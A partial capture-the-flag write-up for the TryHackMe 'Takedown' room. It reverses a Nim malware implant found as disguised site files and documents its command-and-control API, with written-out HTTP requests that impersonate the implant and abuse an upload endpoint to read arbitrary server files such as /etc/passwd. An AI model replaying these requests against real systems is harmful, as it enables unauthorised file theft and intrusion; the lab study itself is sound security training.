# Takedown

https://tryhackme.com/room/takedown

Rated "INSANE"

- the server exposes port 22 and 80
- on the site, the favicon.ico is a windows binary. Additionally, under /images is shuttlebug.jpg.bak (an IoC according to the rooms intro) which is also a binary. These are the same program, for windows and linux.

Which binary you reverse doesn't matter so much, as much as what it does. Opening them with Ghidra shows they are nim binaries, which is a bit tricky to reverse but still possible.

- the entry point is the function `NimMainModule`
- it checks two flags, -v and -h. -h prints a short help message, while -v is presumably 'verbose', as its checked throughout the program before a message is printed telling you what the program is doing
- first thing it does is run `whoami`, checking the response against a hardcoded username `c.oberst`, as the 'keyed username'. if this fails the program exits
- next it runs the `hostname` command, and stores the result
- after that, in initial_check_in__main, it makes an api request with the hostname given. this is to `http://takedown.thm.local/api/agents/register`, with the user-agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5` and content type `application/json`. the content sent is `{"uid":"","hostname":""}` with the uid looking like a random string, and the hostname taken from above

  sending a request like:
  
  ```
  POST /api/agents/register HTTP/1.1
  Host: takedown.thm.local
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
  Connection: close
  Content-Type: application/json
  Content-Length: 43

  {"uid":"fakeuid","hostname":"fakehost"}
  ```
  
  can be seen to respond with:
  
  ```
  New agent UID: fakeuid on host fakehost
  ```

- once registered, it enters a loop. this makes a call (in `check_for_commands__main`) to `http://takedown.thm.local/api/agents/[UID]/command` (with the useragent from before)

  this can be seen with
  
  ```
  GET /api/agents/fakeuid/command HTTP/1.1
  Host: takedown.thm.local
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
  Connection: close

  ```
  
  which responds with values like
  
  - `upload bar.txt foo.txt`
  - `id`
  - `whoami`
  - `hostname`
  - `pwd`

- when it receives a command, this is passed to `command_handler__main`, which splits the command on spaces. there are only a fixed number of commands, of which the most interesting are `upload` and `download`. the command is run and then the result returned to main
- once run, the results are sent back to the command api handler as a post request, with the value in a results parameter:

  ```
  POST /api/agents/fakeuid/command HTTP/1.1
  Host: takedown.thm.local
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
  Connection: close
  Content-Type: application/json
  Content-Length: 25

  {"results":"fakeresult"}
  ```

  comes back with `OK`
  
- the upload command appears to mean upload a file from the server to the host:

  ```
  POST /api/agents/fakeuid/upload HTTP/1.1
  Host: takedown.thm.local
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
  Connection: close
  Content-Type: application/json
  Content-Length: 22

  {"file":"bar.txt"}


  ```
  
  this responds with this file from the server. the path is straight interpreted: /etc/passwd works to grab that file
  
- download copies to the server, passing a payload like `{"file":"","data":""}`:

  ```
  POST /api/agents/fakeuid/download HTTP/1.1
  Host: takedown.thm.local
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
  Connection: close
  Content-Type: application/json
  Content-Length: 45

  {"file":"test.txt",
  "data":"dGVzdA=="
  }


  ```
  
  its unclear where this data lands
